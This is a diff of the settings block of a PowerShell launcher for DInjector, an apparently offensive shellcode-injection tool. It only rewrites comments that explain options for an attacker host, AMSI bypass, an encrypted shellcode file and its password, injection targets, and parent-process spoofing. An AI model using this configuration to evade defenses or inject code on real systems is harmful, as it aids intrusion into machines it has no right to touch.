@@ -1,31 +1,31 @@
-# MODULE
+# module name
 $M = "currentthread"
 
-# LHOST
+# attacker's host
 $H = "10.10.13.37"
 
-# AMSI
+# bypass AMSI ("True" / "False")
 $A = "True"
 
-# DLL
+# injector filename
 $D = "DInjector.dll"
 
-# SHELLCODE
+# encrypted shellcode filename
 $S = "enc"
 
-# PASSWORD
+# password to decrypt the shellcode
 $W = "Passw0rd!"
 
-# IMAGE
+# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
 $I = "C:\Windows\System32\svchost.exe"
 
-# PROCESS
+# existing process name to inject into (used in "remotethread" and "remotethreadsuspended")
 $P = "notepad"
 
-# PARENT PROCESS
+# parent process name to spoof the original value (use "0" to disable PPID spoofing)
 $PP = "explorer"
 
-# BLOCK DLLS
+# block 3rd-party DLLs ("True" / "False")
 $BD = "True"
 
 # --------------------------------------------------------------------
